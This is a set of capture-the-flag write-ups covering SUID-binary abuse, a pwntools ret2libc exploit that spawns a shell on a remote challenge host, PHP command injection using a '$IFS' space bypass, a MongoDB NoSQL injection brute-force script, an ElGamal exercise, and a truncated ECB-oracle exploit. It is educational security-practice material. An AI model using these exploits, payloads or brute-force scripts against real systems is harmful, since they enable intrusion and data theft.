    rise(275): Misc

    CTF{master_of_brute}

    Summary

    We get a authenticating via SSH to ctf@159.223.26.66 -p4556, using the password d4rk_kn1ght

    Once we connect to the SSH we can see that in the main directory of our user ctf there is a FLAG file that we can’t access.

    Proof of Solving

    Commands
    scp -P 4556 ctf@159.223.26.66:/tmp/power .

scp -P 4556 python ctf@159.223.26.66:/dev/shm/.x/

    Because we have connection to the SSH we can use scp -> man scp in order to upload linpeas.sh or the required tools to enummerate the machine.

    In this case I used find / -perm -u=s -type f 2>/dev/null in order to find the SUID binaries.

    We can see that there is a EXOTIC /usr/bin/power
    I downloaded using the specific scp command.

    By doing some quick dynamic analysis using ltrace we can see that the binary is returning with status code 1.

    That could be because of general errors or because we need to supply some arguments to the binary.

    Something jumped across my eyes firstly…The binary it’s executing fopen("txt.c", "rt") but remember that we gave it c.txt.
    So basically the program it’s trying to fopen(inverse(argument))

    So in order to make it open the right file we will need to inverse the letters of the file we want.

    I used a quick bash script to get the flag.

    mussel(275): Pwn

    Proof of Flag

    UNR{many_faced_god}

    Summary

    We get a binary ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked and a libc.
    Normally if you get a libc and a binary on the pwn challenge, the chances of that to be a RET2LIBC or something similar are very big.

    In this case I just copied a previous ret2libc template and just modified the offset’s.

    Explanation

    My first step when I get this type of challenges is firstly to check the binary so I know what I need to do after

    This is a 64-bit LSB executable non stripped so we can reverse it easy using IDA, Ghidra or any analyzer’s.

    After this I checked the binary functions and exports using objdump -Mintel -d ./mussel | less so I can form an image of the exploit and what I could leak. In my case as you can see the puts

    After this I open my template and I start playing with the binary

    The first step is to find the offset to RSP
    In gdb-peda by running the command pattern create 300 it will create a cyclic pattern with the lenght of 300.

    By running the program using r and giving it the cyclic pattern that we just created we can see we get a crash.

    By running the command pattern search we can find the pattern buffer to the registers.

    And now, the last thing left is to leak the puts address, grep the leaked_puts and calculate the necessary addresses in order to do a succesfully re2libc

    Proof of Solving

    #!/usr/bin/env python2
from pwn import *
#context.log_level='DEBUG'

p = process("./mussel")
elf = ELF("./mussel", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
#libc = elf.libc
rop = ROP(elf)

def start():
        if not args.REMOTE:
                return process("./mussel")
        else:
                return remote("35.198.93.134", 32588)

p = start()

def main():

        global rop

        pop_rdi = (rop.find_gadget(['pop rdi', 'ret']))[0]
        ret = (rop.find_gadget(['ret']))[0]

        puts_got = elf.got['puts']
        puts_plt = elf.plt['puts']
        main = elf.symbols['main']

        payload = ""
        payload += "A"*40
        payload += p64(pop_rdi)
        payload += p64(puts_got)
        payload += p64(puts_plt)
        payload += p64(main)

        p.sendline(payload)

        p.recvline()

        leaked_puts = u64(p.recvline().strip().ljust(8, "\x00"))
        log.info("puts@leak: " + hex(leaked_puts))

        libc.address = leaked_puts - libc.symbols['puts']
        system = libc.symbols['system']
        bin_sh = next(libc.search("/bin/sh"))

        payload = ""
        payload += "A"*40
        payload += p64(pop_rdi)
        payload += p64(bin_sh)
        payload += p64(system)

        p.sendline(payload)

        p.interactive()

if __name__=="__main__":
        main()

    CTF{3b2ceb0403300535fcd4808e8cbdb3cc3bd8f8b674527adce2915467f182faa4}

    Summary

    Command injection without spaces inside insecure system() php call.

    Proof of Solving

    Navigating to the webpage reveals the source:

    In order to run the webpage, a start GET parameter is required.
    The webpage expects a secrets GET parameter, which is then passed unsanitized to to a system function. Thus we have command injection, but without spaces. A bypass would be to use ${IFS} instead of ' '.

    random-web1(200): Web

    Proof of Flag

    CTF{a9b6b13862f0a8d1312d777a91a596eba7cb010f}

    Summary

    Php system() command injection with limited number of characters and without spaces.

    Proof of Solving

    Navigating to the webpage doesn’t show anything. However, there is a comment <!-- /?source --> and, by adding this to the url, reveals the source code of the application:

    The page expects a parameter p and performs the following operations:

    • it calls preg_replace with ['/[^\x21-\x7e]/'] as regex, meaning that only chars from 0x21 to 0x7e will be allowed; so we cannot insert spaces, because the hex representation of ‘ ‘ is 0x20
    • it then strips away any occurence of the word ‘flag’
    • it calls substr($p,0,9), meaning that only the first 9 chars will be considered
    • finally it passes p unsanitized as an argument to a system wget command, so we have command injection
      Listing the directory, we see that the injection works:

    Because of the filters, we will use $IFS instead of space and will cat the flag with the * regex. The final payload is: /?p=;cat$IFS*:

    mongoose(50): Web

    Proof of Flag

    ctf{d130ca6ea8c05c8cf7dcf76dae146f2fcfd62be082e9acb9aa2f0a5934e4eee1}

    Summary

    MongoDB NoSQL injection. The flag is located inside the password field.

    Proof of Solving

    Navigating to the page shows us a login form. From the description and the challenge title, we can assume that the database is MongoDB, which is NoSQL.
    Intercepting a login attempt with burp reveals an endpoint /api/login request with two parameters in POST: username and password.
    After reading about this attack on HackTricks, we can see that the site is vulnerable:

    We can assume that te password is the flag. To find it, I used username[$ne]=1&password[$lt]=char, and I bruteforced each character. If some char value returns false, but char+1 returns true, we know that the character is char:

    I created a python script to find the whole flag:

    import requests

url = "http://35.246.178.49:31998/api/login"
inj = "ctf{"
charset = "0123456789abcdefg"
i=0
prev_chr = 0
headers = {"Content-Type": "application/x-www-form-urlencoded;charset=UTF-8"}

while i < 64:
	i += 1
	for char in charset:
		data = 'username[$ne]=admin&password[$lt]=' + inj + char
		res = requests.post(url, data=data, headers=headers)
		if "Success" in res.text:
			inj += prev_chr
			break
		else:
			prev_chr = char

print(inj + "}")

Topic: ElGamal Encryption/Decryption


Let's start by creating a key pair and signing a message.
If q=65537 and g=31337, can you come up with a valid x? 2

    I have chosen x=2 because it’s a small value.

    h = pow(g,x,q) = pow(31337, 2, 65537) = 1161

    Great choice! We'll use that x for now. Please input the value of h: 1161

    hex(‘hi’) = 0x6869, and int(0x6869) = 26729 = m

    Well done! We'll need a message to encrypt. Convert 'hi' to a number (text -> hex -> int): 26729

    I chose y = 2 because again, it’s a small value

    Ok, let's encrypt it. What y value would you like to use? 2

    Then, I calculated the following:
    s = pow(h, y, q) = pow(1161, 2, 65537) = 37181
    c1 = pow(g, y, q) = pow(31337, 2, 65537) = 1161
    c2 = ms%q = 2672937181%65537 = 7881

    s: 37181
c1: 1161
c2: 7881

    Summary

    The message is encrypted with ECB and then is custom xored. Reversing the server.py and bruteforcing ECB reveals the flag.

    Proof of Solving

    When we connect to the target, we can send a message and it sends us back its ciphertext. From the source code of server,py, I found the following:

    • the program generates a key and an iv which are random and also the block size can be either 16 or 32 bytes
    • first the message is padded with pkcs7
    • then is is encrypted with ECB using the key
    • after that, the ciphertext is split into blocks of size BLOCK_SIZE = 16 or 32, and each block is xored with the previous obtained one, and the first block is xored with the iv

    Because ECB is used, it is vulnerable. The cracking algorithm is very well explained here.

    But before cracking the ECB, we must obtain the first ciphertext, before xoring. For that, we xor each block of the response with its previous block, starting from the final block.

    After we get the initial ciphertext, we must find the prefix size. I did this by manually checking the target. When the block size is 16 bytes (we can see that because the server response is shorter), the response length modifies when entering one ‘A’:

    The flag length is 64 + 5 = 69 bytes. When sending one character, the response length is bigger, because the text overflows in the 7th block. The exploit bruteforces the flag and sends the data so that, when a character is correct, two blocks of ciphertext are identical.

    The exploit I made works for a block size of 16. If the response of the server is in blocks of 32 bytes, it exits.

def xor(a,b):
    return bytes([_a^_b for _a,_b in zip(a,b)])

def split_blocks(x):
    n = math.ceil(len(x)/BLOCK_SIZE)
    return [x[BLOCK_SIZE*i:BLOCK_SIZE*(i+1)] for i in range(n)]

def send_msg(target, msg):
    target.recvuntil('Msg:')
    target.sendline(msg)
    cipher = target.recvuntil('\n')
    cipher = cipher.decode().replace('\n','').replace('\r','')
    return b64decode(cipher.encode())

def get_cipher(xored_cipher):
    blocks = split_blocks(xored_cipher)
    l = len(blocks) - 1
    i = l
    while i > 0:
        blocks[i] = xor(blocks[i], blocks[i-1])
        i -= 1
    return blocks
